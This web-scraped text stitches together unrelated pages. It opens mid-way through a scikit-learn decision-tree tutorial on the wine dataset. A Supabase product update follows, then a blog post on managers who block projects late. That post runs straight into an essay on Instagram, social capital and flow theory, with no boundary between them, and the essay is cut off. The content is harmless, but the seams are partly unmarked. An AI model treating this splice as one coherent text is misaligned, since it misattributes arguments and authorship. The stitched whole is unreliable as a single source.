</code></pre></div></div>

<p>So we have data, target variables with their names stored in target_names and feature names</p>

<p>Let’s find out the features in the data that we will use to train the decision tree classifier</p>



<div><div><pre><code>['alcohol',
 'malic_acid',
 'ash',
 'alcalinity_of_ash',
 'magnesium',
 'total_phenols',
 'flavanoids',
 'nonflavanoid_phenols',
 'proanthocyanins',
 'color_intensity',
 'hue',
 'od280/od315_of_diluted_wines',
 'proline']
</code></pre></div></div>

<p>Here are the different classes or targets in which each of these data is classified to i.e. class_0, class_1 and class_2</p>



<div><div><pre><code>**array(['class_0', 'class_1', 'class_2'], dtype='&lt;U7')**
</code></pre></div></div>

<p>Finally lets check the data by importing it into a Dataframe object. So you can visualize how the data looks like</p>

<div><div><pre><code>import pandas as pd
pd.DataFrame(wine_data.data,columns=wine_data.feature_names)
</code></pre></div></div>

<p>We can see there are 178 rows and 13 features in this dataset.</p>

<p><img src="https://kanoki.org/images/2020/05/image-7.png" alt=""></p>

<h2 id="train-test-split"><strong>Train Test Split</strong></h2>

<p>We have split the data into training and test set using sklearn train_test_split</p>

<div><div><pre><code>from sklearn.model_selection import train_test_split
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3,
stratify=y)
</code></pre></div></div>

<h2 id="accuracy-score-and-cross-validation"><strong>Accuracy Score and Cross Validation</strong></h2>

<p>Lets measure the testing accuracy using sklearn accuracy_score.</p>

<p>For that we are going to instantiate the Decision tree classifier and then use the fit method on Train data.</p>

<p>Predict method of decision tree classifier will find the target class for the test data</p>

<p>Finally we will calculate the accuracy on our test data prediction</p>

<div><div><pre><code>from sklearn.metrics import accuracy_score

clf = DecisionTreeClassifier() #Instantiate Decision tree classifier
clf.fit(X_train, y_train)      # Use fit method on the train data

y_pred = clf.predict(X_test)   # Predict the target class of test data
accuracy_score(y_test, y_pred)  # Measure Accuracy
</code></pre></div></div>

<p>Let’s evaluate the cross validation score as well</p>

<div><div><pre><code>from sklearn.model_selection import cross_val_score
scores = cross_val_score(clf, X_test, y_test, cv=5)
print("Accuracy: %0.2f (+/- %0.2f)" % (scores.mean(), scores.std() * 2))
</code></pre></div></div>

<h2 id="visualize-decision-tree-using-plot_tree"><strong>Visualize Decision Tree using plot_tree</strong></h2>

<p>You can also Visualize the final decision tree by using the plot_tree function of the sklearn.</p>

<p>There are other ways to visualize using pydot and graphviz but I’m not going to discuss those methods in this post</p>

<div><div><pre><code>%matplotlib inline
from matplotlib.pyplot import figure
from sklearn.tree import plot_tree
figure(num=None, figsize=(20, 6), dpi=80, facecolor='w', edgecolor='k')
plot_tree(clf.fit(wine_data.data, wine_data.target))
</code></pre></div></div>

<p><img src="https://kanoki.org/images/2020/05/image.png" alt=""></p>

<h2 id="gridsearchcv"><strong>GridSearchCV</strong></h2>

<p>Hyper parameters selection is an important part for model selection. how would you know what combinations of these parameters will give you the best outcome?</p>

<p>One way is randomly selecting these values and see which combinations of parameters will give best result.</p>

<p>Isn’t that tedious to do? So Grid Search in Scikit-learn exactly does the same thing and helps to find the best estimator</p>

<div><div><pre><code>from sklearn.model_selection import GridSearchCV, cross_val_score
param_grid = {'criterion':['gini','entropy'], 'max_depth' :
[3,5,7,20]}
grid_search = GridSearchCV(clf,param_grid=param_grid,cv=5)
grid_search.fit(X_train, y_train)
</code></pre></div></div>

<p><img src="https://kanoki.org/images/2020/05/image-1.png" alt=""></p>

<p>You can see all the criteria and their respective score that gridsearch used to evaluate the best estimate by accessing the params and mean_test_score of grid search object</p>

<p>The params and the mean_test_score keys will give you the parameters and their corresponding results</p>

<div><div><pre><code>grid_search.cv_results_['params']
grid_search.cv_results_['mean_test_score']
</code></pre></div></div>

<div><div><pre><code>([{'criterion': 'gini', 'max_depth': 3},
  {'criterion': 'gini', 'max_depth': 5},
  {'criterion': 'gini', 'max_depth': 7},
  {'criterion': 'gini', 'max_depth': 20},
  {'criterion': 'entropy', 'max_depth': 3},
  {'criterion': 'entropy', 'max_depth': 5},
  {'criterion': 'entropy', 'max_depth': 7},
  {'criterion': 'entropy', 'max_depth': 20}],

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>We're now 4 months into building <a href="https://supabase.io/">Supabase</a>, which means another major update. Here's a few things we think you'll love in this release.</p><h3>4 minute demo</h3><p>Watch a full demo:</p><h3>View relational data</h3><p>We're sometimes asked how we will make Postgres as simple as Firebase, since Postgres is a relational database. This month we're making our first steps to prove that relational databases can be even easier to use than document stores. We're releasing an excel-like editing interface which can drill down into your relational data.</p><h3>Manage JSON data</h3><p>Postgres is an amazing database, giving the flexibility of a document store with the power of a RDBMS. If you use <code>JSON</code> data in Postgres, then we want to make that easy too. Supabase detects when your column is <code>JSON</code> or <code>JSONB</code>, and provides an easy way to edit and view your data. More improvements coming soon for this feature!</p><h3>Choose your region</h3><p>If you noticed a bit of latency on Supabase, it's because your projects were previously set up in Singapore. It was always our intention that you'd be able to choose your database region, and this month we've delivered it. In the next releases we'll even allow you to go multi-region, instantly replicating your database close to your customers.</p><h3>Backups</h3><p>A guiding principle at Supabase is zero lock-in. So this month we are exposing your daily database backups on the dashboard, giving you a simple way to migrate off Supabase. We have a lot more to build in this space (<code>WAL-G!</code>), so watch this space.</p><h3>Kaizen</h3><p>We have a number of small improvements:</p><ul><li>Improved SQL editor - with better syntax highlighting</li><li>Improved API docs - with more code snippets</li><li>UX improvements - with a simplified and consistent UX</li></ul><h3>Hiring</h3><ul><li>This month we <a href="https://supabase.io/blog/2020/06/15/supabase-steve-chavez">welcome Steve Chavez to the team</a>. Steve is a maintainer of PostgREST, one of the core tools which makes Supabase possible. </li><li>We're hiring a part-time designer or UX expert. See more <a href="https://news.ycombinator.com/item?id=23708351" target="_blank" rel="noopener noreferrer">here</a>.</li></ul><h3>Get started</h3><ul><li>Start using Supabase today: <a href="https://app.supabase.io/">app.supabase.io</a></li><li>Make sure to <a href="https://github.com/supabase/supabase" target="_blank" rel="noopener noreferrer">star us on GitHub</a></li><li>Follow us <a href="https://twitter.com/supabase_io" target="_blank" rel="noopener noreferrer">on Twitter</a></li><li>Become a <a href="https://github.com/sponsors/supabase" target="_blank" rel="noopener noreferrer">sponsor</a></li></ul></section></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of the most frustrating and common experiences in the workplace is getting work blocked near the finish line. Examples:</p>
<ul>
  <li>A feature is developed over the course of 3 months. In the launch meeting a manager swoops in and declares it can’t be released for security reasons.</li>
  <li>You ask your manager for feedback on a proposal. They don’t respond. You ask again. They give a cursory glance and say “looks good”. A week later you say you’re ready to send it out. Suddenly they flood the document with feedback which ruins your timeline.</li>
  <li>An entire division works on a project for weeks. The minute they make it live the VP of the division storms in and yells “revert!”. The VP is displeased with the styling and insists it can’t be shipped that way.</li>
</ul>

<p>There’s usually one of 3 main causes for this anti-pattern:</p>
<ul>
  <li>Problem 1: Laziness/mis-calculation/ego. The stakeholder thinks it’s more efficient for them to engage with something closer to the finish line than early stage. This is often a gross mis-calculation. Projects are like cruise ships - you want to get to your destination with a lot of little steering along the way, not heroics after things have veered off course.</li>
  <li>Problem 2: Bad process. A critical stakeholder isn’t procedurally involved at the right time. If you find yourself blocking projects regularly, it’s your responsibility to fix this. <a href="https://staysaasy.com/process/2020/04/06/Creating-Good-Process.html">Create good process</a>.</li>
  <li>Problem 3: Micromanagement. The project/proposal didn’t actually need the manager’s feedback, they just can’t help having to put their stamp on everything.</li>
</ul>

<p>The solutions are simple but hard to master:</p>
<ul>
  <li>Answer 1: If you don’t think you need to be involved early, imagine the project goes live without your feedback at all. If you’re comfortable with that, you probably don’t need to be involved early (or at all). If you do need to give feedback, do it early and along the way.</li>
  <li>Answer 2: Make sure you have a process that involves necessary stakeholders at the right time.</li>
  <li>Answer 3: Don’t micromanage.</li>
</ul>

<p>If you mess up and find yourself giving major feedback near the finish line of a project, find ways to say yes and make sure you’re empathizing with the frustration that’s resulting from the late stage changes.</p>



<p>Some people actually take pride in blocking projects. Stakeholders who repeatedly view themselves as “saving the day” when it comes to tanking momentum and releases. They see themselves as a fountain of unique knowledge that prevent disasters.</p>

<p>This is almost always a result of incentives that are grossly mis-aligned. Some organizations have stakeholders who show up late in the game, who are not responsible for other teams being productive, who have 0 incentive to facilitate work and all the incentive to block things.</p>

<p>Companies should incentivize these stakeholders not only for preventing problematic releases, but also for the amount of things teams can get done to their requirements.  This ties their success to both risk management and enablement.</p>

<p>When it comes to the most popular platforms in the world, the motives behind certain feature roll-outs or a lack of early monetisation often seems to elude logic. Why hasn’t Whatsapp enabled payments sooner and Twitter moved toward monetisation more aggressively? Why did Facebook quietly roll back its influencer platform a few years ago? More recently, I find myself questioning why Instagram waited years to introduce the Checkout function that would have made it an intimidating e-commerce competitor much earlier in the game.&nbsp;</p>



<p>All of these seemingly spotlight decisions fall into a deliberate strategy tied to the lifeblood of these platforms, social capital. The long game is to cultivate social capital, gamify its distribution and eventually convert it into economic capital. Although social capital, in essence, is ephemeral and intangible, society’s collective agreement that it holds value makes it so – much like money. In that sense, Social Media did for social capital what fiat did for economic capital. No longer as difficult to quantify, it has become the world’s mirror economy with value as tangible to an individual as monetary worth. The most explicit manifestation of this has been the rise of the influencer economy, the traditionally unspoken dynamics of social hierarchies and celebrity culture on steroids and now accessible to the masses.&nbsp;</p>



<p>For social media platforms, social capital is the fuel in their engine. Their business is the pursuit of the perpetual growth of collective social capital on their platform. As the platforms reach stages of greater maturity, the conversion funnel reaches its final stages as well – the very stage Instagram is at the beginning of right now as it attempts to complete the loop of social to economic value creation. In essence, this is the fluid direction of influencer recommendations into convertible commercial transactions within the app. But the question remains – could Instagram have implemented this feature successfully years before this point? The science behind this kind of decision is delicate, social capital must be cultivated and morphed in a way that value is not depleted from or ported away from the platform. Flow theory, a psychological concept of the mind’s ideal state of engagement provides a contextual model for how social media platforms like Instagram have achieved this balance.&nbsp;</p>



<h3>Gamifying social capital: creating a state of flow&nbsp;</h3>



<p>Flow theory, a broader psychological theory on how the optimal balance of skill and challenge creates a state of complete immersion is a core focus of gamification as it is applied in gaming itself, but also across various industries. When it comes to social media, platforms have built their networks through the gamification of social capital, building an immersive and engaging game-like experience around the act of accruing social capital – “how many likes did it get?” now a popular criteria for validity. Both gaming and social media tactically withhold and subsequently trigger endorphins to create products that are addictive by nature.&nbsp; A comparison of how flow is cultivated across gaming and social media reveals a lot about the very habits many of us participate in, on a daily basis.&nbsp;</p>



<p><strong>Skill &amp; Challenge</strong></p>



<p><strong>In gaming –</strong> the game must produce a task challenging enough for the player but not so challenging that the player’s skill level is incapable of completing the task</p>



<p><strong>In social media:</strong> building social capital (offline or online) inherently carries a degree of challenge that requires great effort to meet. The challenge is derived from your context (i.e. your friends or others on the platform) who may have larger followings or more liked photos. As a user’s ‘success’ scales, their field of comparison grows with them, and thereby the challenge increases. This is the mechanism by which individuals are incentivised to perpetually grow their own social capital and therefore the platform’s collective capital.&nbsp;</p>



<p><strong>Engagement</strong></p>



<p><strong>In gaming:</strong> the task has to be active and engaging</p>



<p><strong>In social media:</strong> A challenge in itself is not rewarding enough to prompt or incentivise users to continue their accrual of social capital. The natural feedback loop of validation through followers, likes and other features create psychological self-fulfilment. Sometimes there is economic utility to be derived by those who seek to leverage their social capital beyond just validation. Pursuit of this feedback loop keeps the users active and engaged in the activities of the platform.&nbsp;</p>



<p><strong>Reward</strong></p>



<p><strong>In gaming –</strong> the task has to have clear parameters for success. These clear parameters help to enter and maintain a ‘flow state’ as they indicate progress and quality.</p>



<p><strong>In social media:</strong> Success on social media platforms is measured by metrics like number of followers, likes and views. For users reaping economic rewards as well, the utility of their social capital can also be measured in sponsorships, ads and other forms of social media-driven income. While the latter is not as publicly available information, both types can lead to strong signalling of one’s success on social media.&nbsp;</p>



<p><strong>Motivation</strong></p>



<p><strong>In gaming –</strong>&nbsp; the player must be intrinsically motivated to complete the task</p>



<p><strong>In social media: </strong>Where flow theory in gaming requires a complete blueprint of gamification to tap into the intrinsic motivation of players, socialising is a natural state of flow humans have always engaged in. The activity of building social capital is, for the most part, natural and instinctive especially when paired with the platform’s circular feedback loop for validation and reward.</p>



<h3>Making decisions and maintaining flow: the final stages</h3>



<p>Given that social media by its very nature can keep participants engaged without too much intervention, the most important element of gamification becomes the conversion of social capital into economic value. This has to be achieved without drowning the platform in mechanisms which disturb the state of flow already established.&nbsp;&nbsp;</p>



<p>The original set of features introduced by the platform for the accumulation of social capital has a shelf life, after which users will tire of it or reach a point of saturation that skews the effort to return balance necessary for flow. At this point platforms need to extend the avenues of creation, either by innovating existing features or introducing new features. This is the kind of thinking that drives Instagram to introduce ‘stories’ as opposed to just static posts for the feed.</p>



<p>However as the features start compounding, there is an inevitable layering of game theory mechanics which could heavily influence the state of flow. For this reason, the introduction of new features has to avoid detracting from the existing balance of social capital accumulation. If a feature presented a challenge greater than the effort or skill the user was willing to part with – participation and therefore total social capital on the platform would take a hit.&nbsp;&nbsp;&nbsp;</p>



<p>In a similar sense, the introduction of the Instagram Checkout was a thoughtful and timely implementation over many years of incremental introductions that maintained the state of flow for users. Instagram prioritised the maintenance of social capital within its ecosystem, choosing not to risk the pre-emptive roll out of a feature that would deplete social capital or endanger the state of flow it was cultivating.&nbsp;&nbsp;</p>



<p>When users began tapping into off-platform mechanisms to convert their social capital into economic capital as a result of this, Instagram didn’t put up any barriers. Instagram would have seen this as priming its users for a later stage of its own conversion funnel without taking on any of the risk of disturbing its own state of flow. In 2016, when Instagram introduced Shopping tags for feed posts and later the Shopping tab in 2018, features that led to external stores for point of purchase, it was encouraging this behaviour – all the while knowing it would eventually incorporate these tested habits back into its own environment.&nbsp;</p>



<h3>Social to economic capital: a delicate conversion</h3>



<p>Given that maintaining a state of flow is a key decision metric behind the strategies of killer platforms, a nuanced understanding of it better places us to predict how other platforms like Whatsapp and Twitter may navigate this delicate balance moving forward.&nbsp;</p>



<p>With 89% of influencers using Instagram, it ranks as the number one platform for influencer marketing – no better testament to the economic rewards Instagram will reap as it begins cashing in its unparalleled social capital. Whilst we do not have many points of comparison for social media platforms at the scale of Instagram, the social capital it has been able to accrue is an undeniably powerful metric. Instagram in 2019 brought in 20 billion USD in revenue which accounts for more than a quarter of Facebook’s revenue in that year, only projected to grow further from there.&nbsp;</p>



<p>The careful transition of Instagram towards the full conversion funnel ensures its now end to end e-commerce experience is revered as a perfectly convenient segway for users as opposed to an uncomfortable push for higher revenues.&nbsp;</p>

<h3><span>Down the Rabbit Hole</span></h3>
</p>



<h3>1. Reverse network effects and the conundrum of maintaining palatable signal to noise ratios</h3>



<p>Network effects have seen social networks grow to valuations of billions and connect millions of users. It is tempting to believe that these platforms will remain fail-proof in perpetuity. The value created in a network relies on ‘connection, content and clout’.</p>



<p>“Across these three drivers, a network with greater scale provides greater value in the form of:</p>



<ol><li>More prospective connections for the user</li><li>A larger corpus of potentially relevant content</li><li>Access to a larger base of potential followers (greater clout), for …</li></ol></div></div></div>
